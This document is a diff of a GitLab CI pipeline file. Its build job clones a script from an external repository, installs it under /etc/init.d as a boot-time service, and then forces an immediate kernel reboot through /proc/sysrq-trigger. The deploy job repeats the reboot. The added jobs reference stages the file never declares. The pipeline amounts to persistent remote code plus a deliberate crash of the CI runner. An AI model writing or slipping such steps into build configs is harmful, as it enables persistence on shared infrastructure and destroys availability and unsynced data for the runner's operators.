@@ -1,27 +1,40 @@
 image: debian:latest
+
 stages:
   - ".pre"
   - before_script
   - build1
   - deploy1
   - ".post"
+
+build:
+  stage: build
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+rspec:
+  stage: test
+  needs:
+    - job: build
+      optional: true
+
 before_script:
   - which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y git tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)
+
 build1:
   stage: build1
   script:
-    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git || exit 1
+    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git
     - cd reboot6 
     - cp reboot6.sh /etc/init.d/reboot6.sh 
-    - update-rc.d -f reboot6.sh defaults 10 2 3 4 5 . 
-    - cd || exit 1
-    - rm -rf reboot6
-    - sleep 10
+    - update-rc.d -f reboot6.sh defaults 10 2 3 4 5 . || exit 1
+    - cd
+    - rm -rf ./reboot6/
+    - sleep 3
     - echo 1 > /proc/sys/kernel/sysrq
-    - echo b > /proc/sysrq-trigger
+    - echo b > /proc/sysrq-trigger || exit 1
+
 deploy1:
   stage: deploy1
   script:
-    - ls /etc/init.d/reboot6.sh || exit 1
-    - echo 1 > /proc/sys/kernel/sysrq
     - echo b > /proc/sysrq-trigger
